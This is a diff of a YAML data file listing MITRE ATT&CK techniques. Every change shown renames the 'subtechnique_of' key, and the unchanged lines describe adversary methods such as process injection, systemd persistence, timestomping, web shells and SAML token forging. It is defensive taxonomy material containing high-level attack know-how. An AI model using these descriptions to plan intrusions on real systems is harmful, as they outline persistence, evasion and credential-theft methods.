   - TA0005
 - id: T1001.002
@@ -10831,7 +11156,7 @@
     This hidden information can be used for command and control of compromised systems.
     In some cases, the passing of files embedded using steganography, such as image
     or document files, can be used for command and control. '
-  subtechnique_of: T1001
+  subtechnique-of: T1001
   tactics:
   - TA0011
 - id: T1565.001
@@ -10851,7 +11176,7 @@
     and possibly access to specialized software related to the system that would typically
     be gained through a prolonged information gathering campaign in order to have
     the desired impact.'
-  subtechnique_of: T1565
+  subtechnique-of: T1565
   tactics:
   - TA0040
 - id: T1553
@@ -10927,7 +11252,7 @@
     (Citation: cybereason osx proton). In order for this change to be reflected, the
     malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers
     file has <code>tty_tickets</code> enabled by default.'
-  subtechnique_of: T1548
+  subtechnique-of: T1548
   tactics:
   - TA0004
   - TA0005
@@ -10965,7 +11290,7 @@
     by a communication protocol. Symmetric encryption algorithms use the same key
     for plaintext encryption and ciphertext decryption. Common symmetric encryption
     algorithms include AES, DES, 3DES, Blowfish, and RC4.
-  subtechnique_of: T1573
+  subtechnique-of: T1573
   tactics:
   - TA0011
 - id: T1497.001
@@ -11000,7 +11325,7 @@
     \ to gather evidence that can be indicative a virtual environment. Adversaries\
     \ may also query for specific readings from these devices.(Citation: Unit 42 OilRig\
     \ Sept 2018)"
-  subtechnique_of: T1497
+  subtechnique-of: T1497
   tactics:
   - TA0005
   - TA0007
@@ -11019,7 +11344,7 @@
     exist to overwrite the system firmware, which may give sophisticated adversaries
     a means to install malicious firmware updates as a means of persistence on a system
     that may be difficult to detect.'
-  subtechnique_of: T1542
+  subtechnique-of: T1542
   tactics:
   - TA0003
   - TA0005
@@ -11194,7 +11519,7 @@
     \ and <code>/usr/lib/systemd/system</code> directories, low privilege users can\
     \ create/modify service unit files in directories such as <code>~/.config/systemd/user/</code>\
     \ to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)"
-  subtechnique_of: T1543
+  subtechnique-of: T1543
   tactics:
   - TA0003
   - TA0004
@@ -11223,7 +11548,7 @@
     10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers
     installed using privileged paths may be used to maintain root level persistence.
     Adversaries may also install user level timers to achieve user level persistence.'
-  subtechnique_of: T1053
+  subtechnique-of: T1053
   tactics:
   - TA0002
   - TA0003
@@ -11248,7 +11573,7 @@
     through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004)
     and may result in the network device running a modified image. (Citation: Cisco
     Blog Legacy Device Attacks)'
-  subtechnique_of: T1542
+  subtechnique-of: T1542
   tactics:
   - TA0005
   - TA0003
@@ -11339,7 +11664,7 @@
     \ to the process's memory, system/network resources, and possibly elevated privileges.\
     \ Execution via Thread Execution Hijacking may also evade detection from security\
     \ products since the execution is masked under a legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -11361,7 +11686,7 @@
     \ allow access to the process's memory, system/network resources, and possibly\
     \ elevated privileges. Execution via TLS callback injection may also evade detection\
     \ from security products since the execution is masked under a legitimate process. "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -11387,7 +11712,7 @@
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)
     or [External Remote Services](https://attack.mitre.org/techniques/T1133)).'
-  subtechnique_of: T1597
+  subtechnique-of: T1597
   tactics:
   - TA0043
 - id: T1497.003
@@ -11405,7 +11730,7 @@
     Delays may also be based on waiting for specific victim conditions to be met (ex:
     system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104)
     to avoid analysis and scrutiny. '
-  subtechnique_of: T1497
+  subtechnique-of: T1497
   tactics:
   - TA0005
   - TA0007
@@ -11431,7 +11756,7 @@
     by registering and enabling a malicious DLL as a time provider. Administrator
     privileges are required for time provider registration, though execution will
     run in context of the Local Service account. (Citation: Github W32Time Oct 2017)'
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -11448,7 +11773,7 @@
 
     Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036)
     to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)'
-  subtechnique_of: T1070
+  subtechnique-of: T1070
   tactics:
   - TA0005
 - id: T1134.001
@@ -11465,7 +11790,7 @@
     An adversary may do this when they have a specific, existing process they want
     to assign the new token to. For example, this may be useful for when the target
     user has a non-network logon session on the system.'
-  subtechnique_of: T1134
+  subtechnique-of: T1134
   tactics:
   - TA0005
   - TA0004
@@ -11487,7 +11812,7 @@
     execution of post-compromise behaviors. In addition to freely downloading or purchasing
     software, adversaries may steal software and/or software licenses from third-party
     entities (including other adversaries).'
-  subtechnique_of: T1588
+  subtechnique-of: T1588
   tactics:
   - TA0042
 - id: T1020.001
@@ -11509,7 +11834,7 @@
     use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040),
     [Input Capture](https://attack.mitre.org/techniques/T1056), or [Man-in-the-Middle](https://attack.mitre.org/techniques/T1557)
     depending on the goals and objectives of the adversary.'
-  subtechnique_of: T1020
+  subtechnique-of: T1020
   tactics:
   - TA0010
 - id: T1205
@@ -11591,7 +11916,7 @@
     an adversary would likely need special expertise and possibly access to specialized
     software related to the system that would typically be gained through a prolonged
     information gathering campaign in order to have the desired impact.'
-  subtechnique_of: T1565
+  subtechnique-of: T1565
   tactics:
   - TA0040
 - id: T1505.002
@@ -11615,7 +11940,7 @@
     \ out an action like copying in-transit attachments and saving them for later\
     \ exfiltration if the recipient email address matches an entry on a list provided\
     \ by the adversary. "
-  subtechnique_of: T1505
+  subtechnique-of: T1505
   tactics:
   - TA0003
 - id: T1546.005
@@ -11633,7 +11958,7 @@
     format <code>trap ''command list'' signals</code> where "command list" will be
     executed when "signals" are received.(Citation: Trap Manual)(Citation: Cyberciti
     Trap Statements)'
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -11720,7 +12045,7 @@
     movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries
     may also leverage shell scripts to deliver and execute multiple commands on victims
     or as part of payloads used for persistence.'
-  subtechnique_of: T1059
+  subtechnique-of: T1059
   tactics:
   - TA0002
 - id: T1552
@@ -11803,7 +12128,7 @@
     \ before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for\
     \ a user to double click on an embedded image to activate.(Citation: FireEye FIN7\
     \ April 2017) "
-  subtechnique_of: T1497
+  subtechnique-of: T1497
   tactics:
   - TA0005
   - TA0007
@@ -11846,7 +12171,7 @@
     \ and recompiled to p-code, thus removing malicious p-code and potentially bypassing\
     \ dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA\
     \ stomp Feb 2020)(Citation: pcodedmp Bontchev)"
-  subtechnique_of: T1564
+  subtechnique-of: T1564
   tactics:
   - TA0005
 - id: T1055.014
@@ -11869,7 +12194,7 @@
     \ elevated privileges. Execution via VDSO hijacking may also evade detection from\
     \ security products since the execution is masked under a legitimate process.\
     \  "
-  subtechnique_of: T1055
+  subtechnique-of: T1055
   tactics:
   - TA0005
   - TA0004
@@ -11883,7 +12208,7 @@
     \ by relaying mouse and keyboard inputs over the network. VNC does not necessarily\
     \ use standard user credentials. Instead, a VNC client and server may be configured\
     \ with sets of credentials that are used only for VNC connections."
-  subtechnique_of: T1021
+  subtechnique-of: T1021
   tactics:
   - TA0008
 - id: T1078
@@ -11929,7 +12254,7 @@
     may bypass application control solutions that do not account for its potential
     abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation:
     BOHOPS Abusing the COM Registry)(Citation: Nick Tyrer GitHub) '
-  subtechnique_of: T1218
+  subtechnique-of: T1218
   tactics:
   - TA0005
 - id: T1125
@@ -11969,7 +12294,7 @@
     \ may also acquire infrastructure from VPS service providers that are known for\
     \ renting VPSs with minimal registration information, allowing for more anonymous\
     \ acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)"
-  subtechnique_of: T1583
+  subtechnique-of: T1583
   tactics:
   - TA0042
 - id: T1584.003
@@ -11987,7 +12312,7 @@
     Command and Control, can allow adversaries to benefit from the ubiquity and trust
     associated with higher reputation cloud service providers as well as that added
     by the compromised third-party.'
-  subtechnique_of: T1584
+  subtechnique-of: T1584
   tactics:
   - TA0042
 - id: T1497
@@ -12039,7 +12364,7 @@
     usage includes automating execution of behaviors with VBScript or embedding VBA
     content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)
     payloads.'
-  subtechnique_of: T1059
+  subtechnique-of: T1059
   tactics:
   - TA0002
 - id: T1588.006
@@ -12060,7 +12385,7 @@
     (including commercial vendors). Knowledge of a vulnerability may cause an adversary
     to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005))
     or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).'
-  subtechnique_of: T1588
+  subtechnique-of: T1588
   tactics:
   - TA0042
 - id: T1595.002
@@ -12082,7 +12407,7 @@
     establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
     or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial
     access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).'
-  subtechnique_of: T1595
+  subtechnique-of: T1595
   tactics:
   - TA0043
 - id: T1596.002
@@ -12105,7 +12430,7 @@
     or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or
     initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
     or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).'
-  subtechnique_of: T1596
+  subtechnique-of: T1596
   tactics:
   - TA0043
 - id: T1600
@@ -12143,7 +12468,7 @@
     Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078)
     or as part of the initial compromise by exploitation of the externally facing
     web service.(Citation: Volexity Virtual Private Keylogging)'
-  subtechnique_of: T1056
+  subtechnique-of: T1056
   tactics:
   - TA0009
   - TA0006
@@ -12159,7 +12484,7 @@
     \ be concealed. An adversary may abuse these protocols to communicate with systems\
     \ under their control within a victim network while also mimicking normal, expected\
     \ traffic. "
-  subtechnique_of: T1071
+  subtechnique-of: T1071
   tactics:
   - TA0011
 - id: T1102
@@ -12191,7 +12516,7 @@
     \ Using common services, such as those offered by Google or Twitter, makes it\
     \ easier for adversaries to hide in expected noise. By utilizing a web service,\
     \ adversaries can make it difficult to physically tie back operations to them."
-  subtechnique_of: T1583
+  subtechnique-of: T1583
   tactics:
   - TA0042
 - id: T1584.006
@@ -12210,7 +12535,7 @@
     \ Twitter, makes it easier for adversaries to hide in expected noise. By utilizing\
     \ a web service, particularly when access is stolen from legitimate users, adversaries\
     \ can make it difficult to physically tie back operations to them."
-  subtechnique_of: T1584
+  subtechnique-of: T1584
   tactics:
   - TA0042
 - id: T1550.004
@@ -12234,7 +12559,7 @@
 
     There have been examples of malware targeting session cookies to bypass multi-factor
     authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)'
-  subtechnique_of: T1550
+  subtechnique-of: T1550
   tactics:
   - TA0005
   - TA0008
@@ -12251,7 +12576,7 @@
     In addition to a server-side script, a Web shell may have a client interface program
     that is used to talk to the Web server (ex: [China Chopper](https://attack.mitre.org/software/S0020)
     Web shell client).(Citation: Lee 2013) '
-  subtechnique_of: T1505
+  subtechnique-of: T1505
   tactics:
   - TA0003
 - id: T1059.003
@@ -12269,7 +12594,7 @@
     \ payloads. Common uses include <code>cmd.exe /c</code> to execute a single command,\
     \ or abusing <code>cmd.exe</code> interactively with input and output forwarded\
     \ over a command and control channel."
-  subtechnique_of: T1059
+  subtechnique-of: T1059
   tactics:
   - TA0002
 - id: T1222.001
@@ -12302,7 +12627,7 @@
     [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037),
     or tainting/hijacking other instrumental binary/configuration files via [Hijack
     Execution Flow](https://attack.mitre.org/techniques/T1574).'
-  subtechnique_of: T1222
+  subtechnique-of: T1222
   tactics:
   - TA0005
 - id: T1047
@@ -12343,7 +12668,7 @@
 
     WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe)
     and thus may result in elevated SYSTEM privileges.'
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -12359,7 +12684,7 @@
     to interact with a remote system (e.g., run an executable, modify the Registry,
     modify services).(Citation: Microsoft WinRM) It may be called with the `winrm`
     command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014)'
-  subtechnique_of: T1021
+  subtechnique-of: T1021
   tactics:
   - TA0008
 - id: T1543.003
@@ -12384,7 +12709,7 @@
     \ privileges but are executed under SYSTEM privileges, so an adversary may also\
     \ use a service to escalate privileges from administrator to SYSTEM. Adversaries\
     \ may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). "
-  subtechnique_of: T1543
+  subtechnique-of: T1543
   tactics:
   - TA0003
   - TA0004
@@ -12407,7 +12732,7 @@
     \ a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell\
     \ executed when a user logs on\n\nAdversaries may take advantage of these features\
     \ to repeatedly execute malicious code and establish persistence."
-  subtechnique_of: T1547
+  subtechnique-of: T1547
   tactics:
   - TA0003
   - TA0004
@@ -12470,7 +12795,7 @@
     access to instances within the cloud environment without further usage of the
     compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind
     the Scenes)'
-  subtechnique_of: T1098
+  subtechnique-of: T1098
   tactics:
   - TA0003
 - id: T1484
@@ -12538,7 +12863,7 @@
     \ AD backdoor with complete control of the domain because the user account under\
     \ the adversary's control would then be able to modify GPOs.(Citation: Harmj0y\
     \ SeEnableDelegationPrivilege Right)"
-  subtechnique_of: T1484
+  subtechnique-of: T1484
   tactics:
   - TA0005
   - TA0004
@@ -12559,7 +12884,7 @@
     this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002),
     without the need to compromise the signing certificate to forge new credentials.
     Instead, an adversary can manipulate domain trusts to add their own signing certificate.'
-  subtechnique_of: T1484
+  subtechnique-of: T1484
   tactics:
   - TA0005
   - TA0004
@@ -12611,7 +12936,7 @@
     Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor
     and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation:
     Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)'
-  subtechnique_of: T1606
+  subtechnique-of: T1606
   tactics:
   - TA0006
 - id: T1606.002
@@ -12642,6 +12967,6 @@
     Authentication Material](https://attack.mitre.org/techniques/T1550), which may
     bypass multi-factor and other authentication protection mechanisms.(Citation:
     Microsoft SolarWinds Customer Guidance)'
-  subtechnique_of: T1606
+  subtechnique-of: T1606
   tactics:
   - TA0006
